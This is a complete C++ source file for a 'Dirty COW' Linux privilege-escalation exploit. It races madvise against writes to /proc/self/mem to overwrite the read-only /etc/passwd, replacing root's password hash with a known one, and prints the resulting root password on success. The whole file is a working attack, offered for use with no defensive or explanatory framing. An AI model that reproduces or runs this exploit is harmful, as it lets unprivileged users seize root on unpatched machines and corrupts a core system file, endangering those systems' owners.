#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>

#define  PWDFILE     "/etc/passwd"
#define  BAKFILE     "./.ssh_bak"
#define  PSM         "/proc/self/mem"
#define  ROOTID      "root:"
#define  MAXITER     5000000
#define  defPwd      "$6$P7xBAooQEZX/ham$9L7U0KJoihNgQakyfOQokDgQWLSTFZGB9LUU7T0W2kH1rtJXTzt9mG4qOoz9Njt.tIklLtLosiaeCBsZm8hND/"

using namespace std;

class Dcow{
    private:
       bool              exit;
       void              *map;
       int               fd,         iter;
       string            buffer,     etcPwd,      etcPwdBak;
       thread            *writerThr, *madviseThr, *checkerThr;
       ifstream          *extPwd;
       ofstream          *extPwdBak;
       struct stat       st;

    public:
       Dcow(void);
       ~Dcow(void);
       int  expl(void);         

};

Dcow::Dcow(void){
   exit   = false;
   iter   = 0;
   extPwd = new ifstream(PWDFILE);   
   while (getline(*extPwd, buffer)){
       etcPwdBak.append(buffer).append("\n");
       size_t pos = buffer.find(ROOTID);
       if( pos != string::npos && pos == 0){
          etcPwd.append(ROOTID).append(defPwd);
          etcPwd.insert(etcPwd.end(), buffer.begin() + buffer.find(":", 5), buffer.end());
          etcPwd.append("\n");
       }else{
          etcPwd.append(buffer).append("\n");
       }
   }
   extPwdBak = new ofstream(BAKFILE);
   extPwdBak->write(etcPwdBak.c_str(), etcPwdBak.size());
   extPwdBak->close();
   fd = open(PWDFILE,O_RDONLY);
   fstat(fd, &st);
   map = mmap(nullptr, st.st_size, PROT_READ,MAP_PRIVATE, fd, 0);
}

Dcow::~Dcow(void){
   extPwd->close();
   close(fd);
}

int  Dcow::expl(void){
   madviseThr = new thread([&](){ while(true){if(exit) break; madvise(map,100,MADV_DONTNEED);}});
   writerThr  = new thread([&](){ int fpsm = open(PSM,O_RDWR);  
                                  while(true){ if(exit) break; lseek(fpsm,(off_t)map,SEEK_SET); 
                                               write(fpsm, etcPwd.c_str(), etcPwd.size()); }
                                });
   checkerThr = new thread([&](){ while(iter <= MAXITER){ extPwd->clear(); extPwd->seekg(0, ios::beg); 
                                               buffer.assign(istreambuf_iterator<char>(*extPwd),
                                                             istreambuf_iterator<char>());
                                               if(buffer.find(defPwd) != string::npos && 
                                                  buffer.size() >= etcPwdBak.size()){
                                                  exit = true; break;
                                               }
                                               iter ++; usleep(300);
                                             }
                                   exit = true;
                                });
  madviseThr->join();
  writerThr->join();
  checkerThr->join();

  return [](int ret){ if(ret != MAXITER){cerr << "Root password is: dirtyCowFun\nEnjoy! :-)\n"; return 0;}
                else{cerr << "Exploit failed.\n"; return 1;} }(iter);
}

int main(){
   Dcow dcow;
   return dcow.expl();
}
